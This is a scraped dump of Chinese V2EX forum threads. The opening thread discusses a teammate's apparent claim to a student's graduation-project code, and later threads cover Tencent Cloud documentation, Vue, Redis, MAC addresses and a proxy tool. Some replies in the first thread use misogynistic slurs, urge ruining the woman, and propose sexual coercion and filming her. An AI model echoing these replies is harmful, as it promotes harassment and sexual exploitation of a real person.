，她脑子不好使，漏洞太多，只能欺负完全不反抗的人，别人随便反抗一下她就没辙了，有做事的胆但没相应的智商，迟早玩死自己。", " 确实.. 考虑到风险问题, 坏事可能比正道更严格, 失败一次就 gg 了.", "好心机", "已经撕破脸皮了，还想和气，想当然了吧。\r", "不过楼主还想维持现在的话也拿捏住把柄。", "我好像看到了你们用的那个 repo ，目前没有楼主的提交记录？", "Digital Millennium Copyright ACT", "成大器个 P ，她脑子不好使，漏洞太多，只能欺负完全不反抗的人，别人随便反抗一下她就没辙了，有做事的胆但没相应的智商，迟早玩死自己。\r", "\r", "+1\r", "\r", "\r", "欺负怂蛋很准。", "不要放过这种人，这种人不给点教训流向社会危害更大。", "她- -， 1W 行代码换一次，愿意不", "这啥学校这么先进高级。嗯，如果可以的话，日后再说，应该很爽", "搞笑，代码有注解作者的吧？", "楼上说毕业论文 /设计不重要的，应该都是不了解欧美学制的吧？看看毕业论文占多少学分再说吧，很有可能你努力了几年，成绩一直很好，就因为毕业论文没写好，影响总分整个垮掉，再也没机会进大公司了。", "最重要的是长的漂亮不？ 身材如何？", "“此女不简单，执行力强且反应快，日后必成大器啊！”—等待楼主合成神器 /滑稽", "建议直接追到手。", "楼主直接根据 DMCA 要求 github 搞掉他们那个项目啊\r", "\r", "要是觉得队友不公平，那楼主你花一些精力把队友提交的代码摘出来在自己项目上以队友名义提交不就好了吗？\r", "\r", "这种自作聪明的人不干死怎么行？楼主还撕破脸皮不撕破脸皮的，马上要毕业了，过半年之后谁还记得谁是谁？\r", "\r", "到时候怕不是人家还四处吹比，说老娘当年做毕设怎么怎么吊，有个屌丝还说代码是他写的，真是可笑。", " 就喜欢这种洒脱干练的做法", " \r", " \r", "\r", "同意, 她这么做就是根本没把组员放在心上, 楼主还要照顾她的情绪, 殊不知这种人被逼急了一般就主动堆笑脸放低身段了. 见得多了.", "难成大器，真的。做事情要圆滑周全，最起码不能给自己挖坑吧", "畏首畏尾，还来这里发帖作甚？", "哈哈，这样的人最喜欢和 LZ 这样的包子合作了。\r", "有理你都怕，如果自己没证据，她置于你何地，不加倍奉还反而笑脸相迎，我服气啊。", "撕，丝毫不需要照顾这个人的想法，一旦她公开说出都是她的成果的时候，这个人在我这里已经不值得任何考究了。", "做事圆滑、顾全大局都是建立在自己的利益不受损的基础上\r", "这种女的别听楼上 V 友说的日后再说，能让你日也会完事后告你强奸", "人善人欺天不欺，弄死她为止，不给教训人品继续恶劣下去会害人害己害社会。", "你们学校挺牛逼的啊。还会用 github", "不难解决。只要你传网盘之前在自己的 private repo 提交过，那就可以用提交时间证明是你写的", "道理我都懂，一开始为什么要传网盘\r", "github 不是可以打包下载代码吗？截个图，把下载那个按钮圈出来给她多好？", "和老师讲讲 \"码农的名义\"", "把你的 commit  跟她的代码对比下。问问她代码逻辑，你看看她知道多少。", "恶心玩意，直接 T 出课题组", "所有事项都要邮件抄送，不要只是用 IM 。\r", "现在很多公司，我特别讨厌的一个地方就是，用 IM 作为办公工具。", "dcma 和 dmca 代表什么意思  \r", " #97", "最讨厌这种心机婊，打蛇不死，反受其害。不能学东郭先生，得弄废了她", " DMCA ", " ， DCMA 不知道是什么意思，可能是大家笔误", " 赞，感谢前辈，这神仙跳我都没有想到。这真是 x 里有毒啊😂", "放任等于害了别人。", "心机婊", "看到很多人骂我，我很开心，这说明现在的年轻人都很有自己的思想。不过我觉得楼主的做法更成熟一些：\r", "1 、不管是 DMCA 还是 DCMA ，都不是解决问题的办法，这根本就不是一个技术问题。\r", "2 、更何况会影响到另外两个无辜的队友，如果她想继续搞事情，能有一百种不同的办法。 \r", "从道德的角度来说，学术腐败是非常令人反感的，但是我希望 V2EX 的网友能够更理智一些，不要因为事不关己就随随便便把楼主推上道德的制高点，楼主只是个学生，他需要在五月份之前完成毕设和论文答辩，如果一门心思地去维权，可能会影响人家的学业！\r", "另外，我只是表达个人观点而已，并没有想伤害谁，如果你不同意，请不要随随便便就开启谩骂模式，谢谢！", "如果老师不想管的话，楼主可以投诉到系（院）里。院里出面协调的话，毕设导师就得有公开调查和交代了。", "啧啧，楼主蛮有远见的", " 当她自己做了选择的时候，就应该承担相应的后果！而不是让别人承担后果，自己享受成果！\r", "\r", "你这个论调叫好像强奸已经开始了，那就躺好，不然找警察会影响人家一生；或者被绿了之后吹箫助兴祝她幸福。如果这个叫做成熟，呵呵，祝你成熟。\r", "\r", "我认为出了这样的事情，整个团队已经很难共事了，就算最坏也不过是踢一个没什么能力的人（据楼主所说贡献微乎其微），剩下三人照样做事毕业。 就算最后裁决是留下，那也不会再有什么话语权，分配给她基本的能过线的一份成绩，她就应该感激了。若是这种情况还想搞事的话，又何必手软呢。\r", "\r", "给楼主一些可选的解决方式：\r", "\r", "1. 联系 github 移除项目\r", "\r", "2. 如果觉得两个无辜队友过意不去，那么你重置项目之后花一个晚上以他们的名义（改个提交者邮箱就行）将他们的代码重新提交掉。\r", "\r", "3. 向学院和学校举报，当然这个反应比较慢可能不太靠谱。\r", "\r", "4. 大字报，我觉得楼主这帖子内容就不错，找个没人的时候往学院楼下、食堂门口贴一贴（这是比较靠后的手段）\r", "\r", "5. 开着手机录音找她谈，先提出要求她自己当天立即删项目然后重建空项目，给你 admin 权限你去自己弄库上去（不要让她拖延，重建项目在于清空提交统计，不让她有机会拿这个说事）。看她认不认，看情况告诉她你准备做的 1 3 4 ，看她反应，如果她认了，那万事大吉，你回头善后再把经过跟剩下俩队友一讲，事情就结束了。如果不认，你先告诉她对话已经录音，将作为证据的一部分；还不怂的话 1 3 4 来一套三连，最后用 2 善后。\r", "\r", "这样整件事情就完结了。此外如果她当场哭闹的话，楼主要赶快跑！立即跑！特别是不要被抓住，不然搞一个同情牌大闹一阵事情又很难看了。\r", "\r", "一般来说也不用特别做什么，理想情况下 5 + 2 两条足矣。\r", "\r", "另外 5 中的重建建立在如果提交给学校的东西不能改的基础上，如果能改删库自己弄就行了。\r", "\r", "现在就想到这么多，如果当事人是我，这就是我的行动预案。", "还有，大学同学毕业之后绝大多数真的是再也见不到了！\r", "\r", "有的人畏威而不怀德，自己还不占理，就是这样的呀。", "git commit 不签名的情况下作者可以随意伪造\r", "无法用做证明\r", "\r", "技术解决不了的还是动口说清楚比较好\r", "两个人跟老师一起当面谈一下这个情况 她承认了就一切都好说\r", "\r", "我觉得老师也有问题 group work 难道不应该做 peer review 么\r", "看 contribution 能说明什么", "毕业设计还要组队，我做过的绝大部分项目的最大障碍就是队友（还往往强制组队）。", " 我亲身经历告诉你，这种心机婊放过了绝对会反咬你一口直到最后把你搞死，因为只要你手上还掌握着她的不利证据，她就不会安心，不把不稳定因素彻底清除这种人是不会安心的。你放了一马就是害你自己。\r", "\r", "我当初是整个 project 被心机婊直接在项目书上写出她的 idea 了，我只是一个码代码实现的，最后同意放她一马，条件都谈妥了，台词都背好了，对外公布的时候，我说完了，心机婊立马换台词了。你问我为啥不反抗？我特么就是妇人之仁，把这个项目说成了是共同努力的结果。", " 很多人都是站在楼主和自己的角度来看问题，把自己以被侵害者的身份代入场景看的这个问题。换一个视角，假设你处在心机婊的位置，按她的思路，这个事情后面怎么做？有这种心思的人怕是 N 套预案都出来了吧，被揭发了怎么应对；不被揭发怎么利益最大化？", " 这样的话我就认了好吧，偷代码这种破事我还是不屑搞的", " 我碰到的还没有到偷代码这个层次，因为她根本不会写代码。偷的是 idea ，然后在 ppt 和项目书上写的角色分工把我给弄成个给她写代码实现的了，呵呵。我也是傻，太容易亲信这种搞小心机的人了，可能这就是长大的过程吧。\r", "\r", "你没有碰到过那种全程没参与，领导过来视察，腆着个脸上去装行家讲解的，还顶着博士头衔呢。哈哈。反正我现在是不跟这种人说话，不打任何交道。", "妹子也许也上 V 站 :)", " 只能帮你到这，楼主你自己看着办吧！", "做事不做绝 打人不打脸 日后好相见\r", "\r", "这就是人类社会生存之道 恭喜楼主你已经毕业了", " 谁拿走了你的幽默感？", "把你之前写的代码重构，你人不一定仔细阅读过你的代码，不了你之前解逻辑业务，你就说之前写欠缺考虑，不要硬来，这种事要背后默默的干", "没准，在重构的过程中你写的更好。“抱怨是一件最没意义的事情，如果实在难以忍受周围的环境，那就暗自努力练好本领，然后跳出那个圈子。 ​​​​”别人说的引用一下", "从大一以来各种东西都是我一个人全揽的，代码文档都写 ", "  \r", "我自己一个人干可能要 2 天，几个人一起做估计就要一星期了", "楼主真的强", "网盘的上传时间会不会比 git commit 的时间靠前？", "怎么觉得她说“谁让你传网盘的”这句的时候已经撕破脸皮了呢...", "妹子漂亮不", "建议楼主以后完成重要项目后，找个时间戳服务网站公证一下", "队友的代码可以 cherry pick 出来，写个小脚本摘出来，然后就能核平她不波及队友啦", "哇，社会是真的险恶", "给老师发邮件，抄送全组成员+教务处", "圣母被揭穿后就开始长者模式向小年轻传授人生经验了 我们给他鼓鼓掌\r", "另外那些日啊日的 个人博客就直接挂在资料里面一眼就看到了 虽然你就是这样的人可是这样大张旗鼓的真的好吗 ", " ", " 看到 moe.edu.cn 吓一跳😂", "表示关注。。。", "挂出来给各位 hr 朋友开开眼嘛，另外也防止这位以后一不小心被我给内推了", "什么学校这么前卫！好想去！", "用代码换她身体，拍视频。。。", "真心是哪里都有纷争啊", "建议秋后算账，这种人需要教训。\r", "另外， v2 这种热度，楼主没必要杞人忧天担心影响什么现实里会给你有多大的影响。", "这种人 LZ 还敢放在组里，真不怕她逮着机会在阴你一顿大的，然后刚好又没证据，呵呵。。。\r", "那个女的成不成大器不知道，你这手腕是够呛做老板了", "楼主有后续么，感觉没啥动静", "看代码贡献量评工作量这计算方式不合理吧。。。。", "无用代码提交攒量也能算吗。。。", "大部分人应该把 DMCA 误读成 DCMA 了…", "能成大器，还能让你吓唬住？ 你直接跟她说，陪老子睡一觉，代码都是你的"]},
{"content": ["<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/QcloudCommunity\">QcloudCommunity</a>\r<br>\r<br>想用个 cos ，没有 go 的 sdk ，没关系，有 json api ，弄了两天各种错误，想了想，还是下个其他语言的 sdk 照着葫芦画瓢吧，下了 c#的 sdk ，也是各种错误，有的错误码文档中都没有，很多人在腾讯云的论坛提问，没个有用的回答，提个工单吧，跟我要 id  key  和代码，行，给你，然后，处理中……就没消息了\r<br>\r<br>我就不明白了， sdk 都没法用，你们挂上面干嘛？\r<br>\r<br>论坛没人管，开了干嘛？\r<br>\r<br>服。</div>"], "reply": "31", "tittle": "我是真服腾讯家的文档", "comment": ["客服内心：领导要求的 你能看就行了 要求真多\r", "客服现实：对不起 已经把你的要求反馈上去", "客服人员都是外包的，你只有找到工程师才能给你答复\r", "另外论坛前期工程师在里面发帖解答问题的，现在已经被公关部门管理了，还有就是一些代理啊，什么之类的\r", "你觉得问那些人技术问题和对牛弹琴有啥区别", "鹅厂文档的一贯尿性， 日常", "支付宝的文档才是真的烦", "我以前也很困惑,很多人说文档差,最后还是很多人变骂变做出来了...\r", "\r", "是不是,大家以前不断尝试,试错,写博客总结...最后弄出一堆民间博客文档- -然后,后来人就饮水了- -", "微信的文档也坑爹", "小程序的支付文档..集成过得都懂...", "微信文档 ==！", "他们的腾云阁很多文章都是用户写的，所以要用他们的产品得用户自己琢磨。", "文档我只服 msdn", "呵呵, 鹅厂的文档, 习惯就好", "腾讯：这文档不过是随便写写的，就算我们不提供文档你们也要用，不爽不要用啊", "内部文档也这样。", "对外的产品，文档优先级也很低，很多时候都是外包写。", "文档我只服 微软", " \r", " \r", " \r", "都是他家的，以前做微信支付的时候，下载的 demo 也是不能运行，一边改啊一边写", "腾讯的 cos 不要用，辣鸡。是一群不懂云储存的人搞的，会让你怀疑人生", " 那…你推荐个？", " 阿里 OSS ，百度 BOS 。", "文档，你是在搞笑么，当时找个腾讯视频的哥们对接腾讯云的互动直播，结果都是文档驴唇不对马嘴，各种 bug ，不全，更重要的是，在内部去联系写文档的人，都联系不上。", " 所以微软 win10 bug 越来越多", "腾讯的 cos 有 v3 v4 两个版本 ，文档里面提供的 sdk 是 v4 的。\r", "如果你开通的时候是 v3 的 cos 你是找不到任何升级 v4 的入口的。", "阿里系的一样的毛病\r", "支付宝接口某个参数被废弃了很久\r", "突然某一天  居然他们修复了  然后可以自由顺利唤起 app 付款了....", "github 上有个开发版本\r", "文档我只服 vue.js", "文档和 kpi 有关系吗？面向 kpi 编程", " 外国人对这方面的东西都蛮重视的。\r", "欧洲美国日本的项目我都做过。管理水平，文档流程制度领先了国内一个维度。\r", "虽然做的时候挺慢，但是管理+文档让他们几乎不做重复的工作。", " 阿里云和百度都没有免费额度，提醒下，你的回复和艾特我都没提醒", " 我用的是 v4 版， sdk 也是\r", "\r", " 这个还没做完", " 要免费额度做什么？一分钱一分货。数据是无价的", " 听说在内测静默升级 V4 来着，估计马上就升了吧", " 现在也有一些工程师会冒泡，大部分基础问题也解决的不错。"]},
{"content": ["<div class=\"topic_content\">网页在微信内打开，点输入框就假死了，能弹出键盘，但输入不进内容，光标也不闪烁， ios 没问题，好几个安卓手机也没问题，就我的安卓有。。。</div>"], "reply": "1", "tittle": "微信网页输入框假死", "comment": ["检查一下输入框的事件，是不是重复绑定导致事件触发卡死了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>vue.js 直接上代码\n打算做一个利用 algolia 搜索的工具,引用了官方 api 可以查询,想把结果放在数组里面,然后显示出来.\n然而 用了 index.search 的方法可以得到数据,但是循环结束之后数据就没有了. 也就是 1 有回显 2 无回显\nthis.searchResult 应该算是全局变量吧,为什么会丢失数据呢?难道需要进行数组的复制?\n求解 先谢过.</p>\n<pre><code>  data() {\n    return{\n      query:'',\n      searchResult:[],\n    }\n  },\n  methods:{\n    search:function()\n    {\n      var client = algoliasearch('xxx', 'xxx')\n      var index = client.initIndex('getstarted_actors')\n      index.search(this.query,function(err, content) {\n        content.hits.forEach(function(e,index){\n          this.searchResult.push(e)\n        },this)\n        console.log('1'+this.serarchResult) // 有回显\n      });\n       console.log('2'+this.serarchResult) // 无显示数据\n    }\n  }\n</code></pre>\n<p>先谢过大家</p>\n</div></div>"], "reply": "14", "tittle": "Vue.js 数组复制的问题", "comment": ["index.search() 是个异步方法吧，所以 2 执行的时候 this.$data.searchResult 仍然是空数组，然后等回调执行完毕后 this.$data.searchResult 才有值，所以 1 就能打印了。", " 那应该如何解? 用 sleep? 总感觉不科学", "  似乎不是这样的,用了 setinterval 打印出来是 undefined\r", "\r", "```\r", "index.search(this.query,function(err, content) {\r", "        var tmp=[]\r", "        content.hits.forEach(function(e,index){\r", "          tmp.push(e)\r", "        },this)\r", "        this.searchResult=JSON.parse(JSON.stringify(tmp))\r", "        console.log(this.searchResult);\r", "      });\r", "```\r", "这样会打印出来 object 但是 webui 并没有显示出来也就是 this.searchResult 最后还是空", "Vue.netxtTick", " 好 我去看一下", "我觉得一楼是对的，至于没显示出来，可能是 this 丢失了。", "在回调外面 var self = this;  然后回调里面用 self.", " 似乎不可以", " \r", " \r", "我去试一下,似乎还是没明白 我试一下", "用箭头函数拜托，第一层 search 的回调用 function 就已经把 this 给丢了， forEach 第二个参数上下文这个时候 this 已经是 undefined 了。", " \r", " \r", " \r", "感谢你们确实是这样 this 丢失了!", " 刚才又看了下尖头函数 原来这样不会产生新的上下文  谢谢你的分析 又学东西了", "javascript 两大基础： 异步和 this 作用域", " 🙏 说的极是 感觉还有好多要学习"]},
{"content": ["<div class=\"topic_content\">面试官看我用过 redis 就问了这个问题，当时我聊到的 redis 的场景是每个用户在 redis 里有一个 key ， value 是这个用户的好友列表，是个 set 的结构，而且每个用户有个得分，用户主页里要列出这个用户的好友按这个得分排序的列表，这个排序我用了 redis 的 sortedset 。然后面试官问了这个 value 较大的问题，说实话我以前确实没考虑过这个问题，这种问题肯定得和业务场景联系起来的吧，硬着头皮说，在这个场景下拆分成多个 key ，每个 key 分别排序，排好的各拿出前 200 个继续排序，得出总的前 200 个好友，后面的用户排序应该没那么关心了。面试官不是很满意说发散性一般-_-......后来想想这™就是内存不够的排序嘛！ redis value 较大这个只能跟业务联系起来做规避吧？</div>"], "reply": "19", "tittle": "如何解决 redis value 较大的问题？", "comment": ["对同一个 key 的不同 score ，使用不同的加权来实现多个 value 的进一步分组，这个实用吗？", "问下楼主 , 这是把 redis 当数据库了么", " 对，这个东西做成了微信上分享的页面供用户炫耀分数的。至于为什么，师傅定的，我是实习生，还真说不出 123😔", "有时候就是为了用 redis 而用 redis", " 没明白😳", "首先你得确定 value 达到多少 M 了算大，然后估算多少个好友会达到这个上限\r", "你这种业务场景，如果好友列表只存 id 的话，几千个好友都不可能达到那个上限的\r", "其次，这里即使这个 set 的 value 比较大，但因为数据是分页取的，并不会产生慢查询，除非你把整个 set 一下全取出来，如果是，那说明需求不合理，就要改需求为分页获取\r", "而且这个和查 mysql 不同，也不会因为 offset 过大导致读取内存过多的问题", "什么叫 value 较大？是啥问题，大引起了什么问题？是存不下了还是什么？看不懂", "redis 毕竟不是数据库，何苦考虑大 value 的情况，这样 redis 不就失去了意义，快不起来了。", "貌似 redis 中 value 大于 10k 才会引起性能明显下降，你这个 set 集合无论怎么看都不会大于 10k 吧。", " 随着 value 的增加 性能会急剧下降", "你可以反问面试官， 1K 个好友， 1M 个好友，和 1G 个好友的时候分别怎么做", "redis 有序集有 ZRANGEBYSCORE ，支持分页", "说句实话吧，一般绝大部分业务真遇不到 redis value 大带来的问题……所以面试官感觉有点儿小刁难，是不是你介绍里写〔精通〕 redis 了？呵呵。不过反过来说真遇到了那这个问题还挺严重的，嗯。", " 没遇到需要考虑 value 大的场景，因为内存不够用么？这分 key 不也是还不够用么，只能加机器，做分布式", " 我一应届的渣渣敢写精通...连熟悉我都要想一想再写😂", " 这时候就反问面试官咯，还能表达出一幅对知识苛求的样子。最不济骗个答案下次面别的时候可以装个 B 。😂", "面试的问题，早年我遇到过一个面试问我一个以太网底层的问题，然后我正好又知道，回答了，面试官仍然不满意，但是我还是进去了，后来知道这是他们一直困扰解决不了的技术问题。\r", "所以你懂的，互相尊重，谦虚请教，但不卑微，他未必比你明白。句号前的叫自信。", "这种其实就是伪需求，实际开发中应该规避的问题。但是现在却发生了问你怎么解决。直接说不知道没遇见过 把你能说的说了 然后问他怎么解决就好了。 说的好回去查查当学习 说的不好大概说明这个面试官也只不过想让你打不出来从而压点工资。。不必在意。", "sortedset 慎用，这东西数据量打了性能跟不上。 redis 尽量使用 O(1)的操作， redis 做存储用倒也可以，就是要考虑容量的问题，满了之后 lru 就比较麻烦了。"]},
{"content": ["<div class=\"topic_content\">原来的免费账号有 1000 个私有仓库的额度，每个 1G 容量\r<br>\r<br>现在银牌会员只有 5 个私有项目数， 256M Git 仓库容量\r<br>\r<br>黄金会员 100 个私有项目数， 1G Git 仓库容量，年费 199 元\r<br>\r<br>目前是送了一年黄金会员~</div>"], "reply": "1", "tittle": " 感觉要收费了~", "comment": ["收费+免费限制\r", "\r", "毕竟人家也是要赚钱的"]},
{"content": ["<div class=\"topic_content\">本人还是一名在读的大三 电子信息工程 本科生，大二开始跟老师搞计算机视觉的一些项目，然而最近找实习发现这个岗位很多都需要硕士或以上学历，直接笔试就被刷了，就算要求是本科或以上的腾讯，我过了笔试之后面试被踢去 测试开发这个岗位…真是好尴尬。虽然自学或者学校课程有数据结构 计算机网络等一些计算机科班的课程，但是感觉还是依然比不上计算机专业的。现在迷惑的是我不想读研，可是C/C++，操作系统等等那些不够计算机的来，找实习找工作的时候定位就很尴尬了，不知道该怎么办。</div>"], "reply": "2", "tittle": "年轻人的迷惑，定位不清晰，求高人指点", "comment": ["学历跟笔试被刷没关系吧。\r", "CV 方向要么有 paper ，要么有比赛成绩，要么有实习经历，门槛确实比较高...", " 笔试题感觉略难"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题, 本来准备边学边弄, 但没时间了. 想到论坛高手多, 只能求助各位, 诚心付费聘老师一名, 手把手教我把 Angular 程序,混淆加密后打包发布到 googleplay 和 apple store 谢 (目前 Angular 手机版已经调试成功) 有意者请留言私信 谢. 我的地点:上海,可以到老师处上门求教. 邮件联系:qqfhzk@hotmail.com............</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "蒸大神一枚, 付费教我把 Angular 程序,加密后打包发布到 googleplay 和 apple store 谢..................", "comment": []},
{"content": "", "reply": "42", "tittle": "SOHU 首页终于是改版了", "comment": ["什么意思？大家都密切注意搜狐搞啥？", "感觉像是今日头条....", "我的手机上只能看半边页面", "变化好大......已经不是门户网站了,感觉......", "虽然不看过搜狐，但那界面真的忍了十几年了。", "十几年没上搜狐了", "搜狐头条", "大概十年之后，看到楼主这个帖子终于又上了一次搜狐这个网站。。", "都没上过，话说，搜狐是靠什么活到现在的？", "比旧版更差……", "   游戏和广告", "当然要密切关注搜狐在做什么，若有上升势头，立即买入其股票", " 游戏？都没听过吖……，网易搞游戏倒是知道。", "\r", "这是什么图标", "几十年过去了才迭代到 V2 也是够克制的了，如果是我，估计现在都超过 100.0 了", "不看好自己的公司", "2017 年的搜狐和 2007 年的差多少？", "信息流广告诱惑力太大了", "还不错", "信息流是大势，但是搜狐搞的太慢了", "  搜狐畅游...在广告业务日渐没落时，靠天龙八部撑着，当然这和网易的大话&梦幻西游没法比。", "头一次见竖着的导航条,真的怪...", " 23# 卢松松博客不是就左侧导航条吗，还有凤凰网的“评论”栏目", " 我是指大型门户网站和大型互联网首页.... 博客当然竖着也好看了...", " 让它作死去把， sohu 千百年不变，我是从来不用搜狐和网易", " +1 \r", "新闻行业网站美工还是喜欢看  澎湃", " 一个垃圾成堆的博客也拿出来比？ 2333", " 也没见这搜狐首页有几篇值得一看的，和其他门的同样的复制粘贴的内容加上不同的恶心系标题而已，对此网站的映像就俩\r", "\r", "1 强制你打开他的首页，自动弹窗的形式\r", "2 首页一堆假鞋横幅广告", "门户网站的衰落", " 我只是指页面布局，我不知道你比的什么。", " 反正我没玩过，只玩过诛仙和基三。", "“在几大商业门户网站中，搜狐是首家将 PC 端页面也改为流形式的”，倒数第一的速度，竟然还找到个第一……", "搜狐这首页是刚毕业的小朋友产品经理策划的", " 跟腾讯、网易这几个门户的官网比，确实是第一了，跟头条、澎湃这些比，那确实是晚的很了……", "第一眼,以为搜狐被今日头条收购了...", "\r", "作为中国领先的媒体平台，搜狐一直以来坚持的就是“改变”。\r", "真的搞笑", " 印象中 sohu 一直从未“改变”", "随便点了下，有 bug 。首页变成信息流了，这个个推做不好简直就是自杀", "导航栏左侧固定，然而并没有多少人点。\r", "\r", "下拉了 1 分钟，竟然毫无底线。\r", "\r", "这个设计挺失败的。", " spring 的图标。", "新域名 dns 没刷够，小运营商用户表示域名不能解析"]},
{"content": ["<div class=\"topic_content\">很奇怪 js 都加载进去了 奈何 body 里面啥内容也没 连 body 的 class 都没了 链接如下\r<br><a target=\"_blank\" href=\"http://m.wkbins.com/illness/insurePolicy/148198068433580000/149155760927092968\" rel=\"nofollow\">http://m.wkbins.com/illness/insurePolicy/148198068433580000/149155760927092968</a></div>"], "reply": "目前尚无回", "tittle": "一个 jsp 页面多次为何多次加载会导致页面空白？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求指导</p>\n</div></div>"], "reply": "9", "tittle": "有那个开源库可以做到从一张图片里识别出人脸并且把人脸抠图出来？", "comment": ["opencv", "QQ 空间有，从一张照片里框出一个人问你“这个人是某某某吗？”", " Facebook 有。。", "QQ 空間和 FB 這種只實現了第一種功能,能實現識別人臉的有很多,能實現第二種功能的我還沒見過...", "搜索 dlib", "opencv 可以的，加上一些 haarcascade 文件，其实就是别人通过机器学习做好的一些脸部特征文件。\r", "之前我写了个把照片上的人带上圣诞帽的小程序，可以看下 ", " 这个里面的 facedet 函数就是检测照片里的人脸，返回位置值", "感谢各位的建议~", "opencv ，只要能定位脸在哪，抠出来并不算难事"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>每日推荐</p>\n<p>只有有 V 友提出希望看到更多 Vue.js 实例，所以我来了~</p>\n<p><a href=\"https://www.qcloud.com/community/article/627271001491017116?fromSource=gwzcw.84416.84416.84416\" rel=\"nofollow\">Vue.js 动画在项目使用的两个示例</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Vue.js 动画在项目使用的两个示例", "comment": []},
{"content": ["<div class=\"topic_content\">平常看到一些教程的截图，里面的 MAC 地址都是打码了的，比较好奇，为什么要这样做呢？</div>"], "reply": "23", "tittle": "MAC 地址为什么要打码？", "comment": ["mac 地址是以太网卡供应商需要确保全球唯一的，别的不说如果你开小号装逼，小号大号都露出 mac 地址了那你小号可能就失去存在的意义了……总之这种能唯一定位的信息确实没必要暴露出来", "WIFI 的 ssid 可以用来定位", "一般来说 MAC 地址相当于你的电脑的身份证，全球唯一。\r", "\r", "不过这玩意可以临时修改，而且有些不厚道厂商可能会使用重复的 MAC 地址，国内某些手机厂商也是没有足够的 MAC 地址池，直接让手机可以自动变 MAC 地址。。。不得不说这些人脑洞真大。。。", " 我还真见过这样的手机，忘记是哪个牌子了，直接结果就是 WIFI 不能加入白名单", "我也好奇,能不能根据 mac 地址,追踪到对方 ip\r", "谁能和我讲下流程...", " 只有 MAC 当然不能，这个地址不能穿越 2 层边界", " 可以啊，比如抓一个 ip 的包，过滤一下 mac 地址。。。", " 路由器出来的包是路由器的 mac\r", "你先看看 7 层模型和路由器的定义", "码农的安全素养吧", "Mac 可用于充当设备的永久唯一识别码，并且它通常会在网络通信中传给下一个节点（@ifaii 说的 2 层边界）", "有的没的：根据 MAC 查水表", " \r", "IPv6 网络下用 EUI-64 格式生成的地址是有被追踪这种可能", " 有些 信息安全面试还叫 用 mac 算 ip 地址呢", " 呃，我面壁去。。。", " 这也行\r", "\r", "Mac 地址修改起来挺简单的", " 根据 Mac Book 应该有", "MAC 除开那些无良厂商，基本都是唯一的，为了某些 '私密性' 当然得打码。\r", "但是有些设备迷的不得了，重启一次变一次 MAC 地址，直接导致路由里面有几百个连接设备历史记录。", "虚拟机的 mac 地址怎么算", "mac 地址属于 ISO7 层模型的二层,出了路由器机器的 mac 就不会存在于数据包里面, 所以基本上互联网路由器上抓包是定位不鸟某个人的（因 mac 地址已变更）, 不过现在大部分的软件都会把 用户的 mac 地址记录下来放到 ip 数据包的 data 部分, 如果 data 部分没有加密， mac 地址就能抓到了。", " 有专门分配 vmware 的，不过你都虚拟机了，二层的东西外面又看不到，，，", "你肯定没学过计算机网络", "我也好奇", " \"现在大部分的软件都会把 用户的 mac 地址记录下来放到 ip 数据包的 data 部分\"， 能否举个例子看看，啥软件这么干的？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>APICloud 渲染优化引擎，经过为期 3 个月的 Beta 版计划，历经上万开发者及商业 APP 、数十万台真实手机参与测试，于 4 月 5 日正式上线，合入 DeepEngine 中。</p>\n<p>Web 工程师使用 HTML5 等标准 Web 技术开发拥有原生体验和原生功能的 APP ， Deep Engine 使用半翻译式原理，运行中将 Web 翻译成 Native API ，强大的混合渲染引擎提供更佳的性能体验。</p>\n<h3><strong>一、优化后的引擎带来哪些性能提升：</strong></h3>\n<p>1 、窗口切换动画帧率得到有效提升，可达到 50 fps 以上，动画渲染效果与原生无差异</p>\n<p>2 、页面滚动性能提升，优化了页面重排&amp;重绘周期，滚动更加流畅，同时消耗更少的 CPU 资源</p>\n<p>3 、优化潜在的过度渲染问题，减少 GPU 及内存消耗</p>\n<p>3 、图片绘制能力提升，加载大量图片的情况下依然不会有漂浮，卡顿的感觉</p>\n<p>4 、支持在 window 和 frame 中使用 video 标签播放视频</p>\n<p>5 、 UI 展示更细腻， CSS3 中圆角图片，背景等可能存在锯齿的兼容问题得到有效解决</p>\n<p>6 、强化容错能力，减小因不规范代码或者引用 JS/CSS 框架等引起的性能问题</p>\n<p>7 、同步提升 SuperWebview 的渲染能力</p>\n<h3><strong>二、优化引擎做了哪些适配：</strong></h3>\n<p>1 、适配某些定制 ROM 存在的窗口切换时黑 /白屏问题</p>\n<p>2 、适配魅族部分手机关闭窗口时屏幕闪动问题</p>\n<p>2 、解决华为及小米部分型号手机输入不响应、滚动卡顿问题</p>\n<p>4 、适配三星部分大屏手机动画卡顿问题</p>\n<p>5 、解决使用 CSS3 某些 3D 动画时引起 UI 闪烁问题</p>\n<p>6 、适配 Android PAD 大屏幕设备，提升整体流畅度</p>\n<p>优化引擎上线仅一天的时间，就收到了广大开发者的好评和赞扬，解决了开发者们的适配等问题。</p>\n<p><img alt=\"103945vw2wfwk9xffg2tkv.png\" src=\"https://ooo.0o0.ooo/2017/04/07/58e6fa72e5e84.png\"></p>\n<p>APICloud 坚守每周一次更新的节奏，持续为开发者和企业带来更多的新产品及服务。在第一时间跟进 Android 和 IOS 技术动向，适配新系统，优化引擎，持续为开发者提供高效稳定的跨平台开发技术。</p>\n</div></div>"], "reply": "1", "tittle": "APICloud 优化渲染引擎上线，解决 App 开发适配难题", "comment": ["你们什么时候支持下电视盒子的安卓系统啊。说了很多年了都没有发布。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近接触一些代理相关的知识，用 Electron 和 Vue 做了一个代理（抓包）客户端，分享一下。</p>\n<p>Github 地址 <a href=\"https://github.com/fwon/electron-anyproxy\" rel=\"nofollow\">https://github.com/fwon/electron-anyproxy</a> 欢迎试玩。</p>\n<p>写了一篇讲思路的文章： <a href=\"https://segmentfault.com/a/1190000008978174\" rel=\"nofollow\">https://segmentfault.com/a/1190000008978174</a></p>\n<p>目前支持以下功能：</p>\n<ol>\n<li>支持 HTTP/HTTPS 请求抓取。</li>\n<li>支持网速模拟。</li>\n<li>支持请求拦截修改，实现跨域等功能。</li>\n<li>实现接口 Mock ，用于本地开发调试。</li>\n</ol>\n<h3>网络抓取</h3>\n<p><img alt=\"pic\" 